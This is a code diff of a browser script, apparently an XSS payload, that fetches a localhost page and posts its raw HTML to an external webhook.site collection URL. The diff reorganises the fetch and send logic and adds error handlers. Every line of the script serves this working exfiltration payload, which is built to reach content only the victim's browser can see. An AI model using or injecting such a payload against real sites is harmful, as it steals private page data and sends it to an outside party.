@@ -2,38 +2,43 @@
 const TARGET_URL = "http://localhost/index.php";  // URL of the page you want to fetch
 const WEBHOOK_URL = "https://webhook.site/998b21e9-1fed-4da1-9818-67cfafdbfaae/";  // Replace with your webhook URL
 
+// Create an XMLHttpRequest object to fetch the page content
 const xhrFetch = new XMLHttpRequest();
-// Create a new XMLHttpRequest object for fetching the page content
-async function fetchAndSendContent() {
-  try {
-    xhrFetch.open("GET", TARGET_URL, true);
-    
-    // Onload event for the fetch request
-    xhrFetch.onload = function() {
-      if (xhrFetch.status === 200) {
-        // Get the content of the page (raw HTML)
-        const pageContent = xhrFetch.responseText;
-    
-        // Check if the page content is empty or invalid
-        if (!pageContent.trim()) {
-          sendFallbackMessage("No content found on the target page.");
-        } else {
-          // Send the actual page content to the webhook
-          sendToWebhook(pageContent);
-        }
-      } else {
-        // Handle HTTP error (e.g., 404 or 500)
-        sendFallbackMessage(`Failed to fetch page: HTTP ${xhrFetch.status}`);
-      }
-    };
+xhrFetch.open("GET", TARGET_URL, true);
 
-  } catch (error) {
-    // In case of any error, send a fallback message
-    sendToWebhook(`Error: ${error.message}`);
+// Onload event for the fetch request
+xhrFetch.onload = function() {
+  let message = "";
+  
+  // Check if the request was successful
+  if (xhrFetch.status === 200) {
+    // Get the content of the page (raw HTML)
+    const pageContent = xhrFetch.responseText;
+
+    // Check if the page content is empty or invalid
+    if (!pageContent.trim()) {
+      message = "No content found on the target page.";  // Fallback message if page is empty
+    } else {
+      message = pageContent;  // Otherwise, send the page content
+    }
+  } else {
+    // Handle HTTP error (e.g., 404 or 500)
+    message = `Failed to fetch page: HTTP ${xhrFetch.status}`;
   }
-}
 
-// Function to send content to the webhook
+  // Send the message (content or error) to the webhook
+  sendToWebhook(message);
+};
+
+// On error event (in case of a network issue)
+xhrFetch.onerror = function() {
+  sendToWebhook("Error: Unable to fetch the page.");
+};
+
+// Send the fetch request to get the page content
+xhrFetch.send();
+
+// Function to send content or message to the webhook
 function sendToWebhook(content) {
   const xhrSend = new XMLHttpRequest();
   xhrSend.open("POST", WEBHOOK_URL, true);
@@ -42,44 +47,22 @@ function sendToWebhook(content) {
   const data = JSON.stringify({
     source: TARGET_URL,
     timestamp: new Date().toISOString(),
-    content: content  // Send the raw HTML content of the page
+    content: content  // Send content or the error message
   });
 
+  // Send the data to the webhook
   xhrSend.send(data);
 
   xhrSend.onload = function() {
     if (xhrSend.status === 200) {
-      console.log("Page content sent to webhook successfully.");
+      console.log("Response successfully sent to webhook.");
     } else {
-      console.error("Failed to send page content to webhook:", xhrSend.status);
+      console.error("Failed to send response to webhook:", xhrSend.status);
     }
   };
-}
 
-// Function to send a fallback message when content is empty or error occurs
-function sendFallbackMessage(message) {
-  const xhrSend = new XMLHttpRequest();
-  xhrSend.open("POST", WEBHOOK_URL, true);
-  xhrSend.setRequestHeader("Content-Type", "application/json");
-
-  const data = JSON.stringify({
-    source: TARGET_URL,
-    timestamp: new Date().toISOString(),
-    content: message  // Send a fallback message instead of the content
-  });
-
-  xhrSend.send(data);
-
-  xhrSend.onload = function() {
-    if (xhrSend.status === 200) {
-      console.log("Fallback message sent to webhook.");
-    } else {
-      console.error("Failed to send fallback message to webhook:", xhrSend.status);
-    }
+  xhrSend.onerror = function() {
+    console.error("Error occurred while sending to the webhook.");
   };
 }
-
-// Send the fetch request to get the page content
-xhrFetch.send();
-
 </script>
